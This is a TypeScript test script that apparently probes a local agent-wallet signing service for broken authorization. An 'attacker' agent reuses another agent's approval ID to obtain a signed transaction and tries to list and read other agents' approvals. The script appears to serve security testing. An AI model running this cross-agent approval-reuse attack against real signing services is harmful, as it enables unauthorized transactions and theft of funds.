import { app, adminPost, agentReq } from "./inject-lib";
import { cap, intent } from "./lib";

const regV = await adminPost("/agents", { agentId: "agent-v" });
const regX = await adminPost("/agents", { agentId: "agent-x" });
console.log("register:", regV.status, Object.keys(regV.body));
const sV = regV.body.secret, sX = regX.body.secret;

const cV = cap({ agentId: "agent-v" });
console.log("cap:", (await adminPost("/capabilities", cV)).status);

const i: any = intent(cV.capabilityId, { to: "0x1111111111111111111111111111111111111111", value: "1000000000000000" }, { amountUsd: 3.2, nonce: 11 });
i.agentId = "agent-v";
const a = await agentReq("agent-v", sV, "POST", "/approvals", i);
console.log("victim approval:", a.status, a.body.status, a.body.approval?.approvalId);

const s = await agentReq("agent-x", sX, "POST", "/sign", { approvalId: a.body.approval.approvalId, transaction: i.transaction });
console.log("ATTACKER agent-x /sign ->", s.status, s.body.status ?? s.body.code, s.body.signatureType, "verified:", s.body.signatureVerified);
console.log("signedTransaction:", String(s.body.signedTransaction).slice(0,46));

// also: can agent-x READ the approval list to discover approvalIds?
const l = await agentReq("agent-x", sX, "GET", "/approvals?status=APPROVED");
console.log("agent-x GET /approvals ->", l.status, "rows:", l.body.approvals?.length);
const one = await agentReq("agent-x", sX, "GET", `/approvals/${a.body.approval.approvalId}`);
console.log("agent-x GET /approvals/:id ->", one.status, one.body.approval?.agentId);
await app.close();
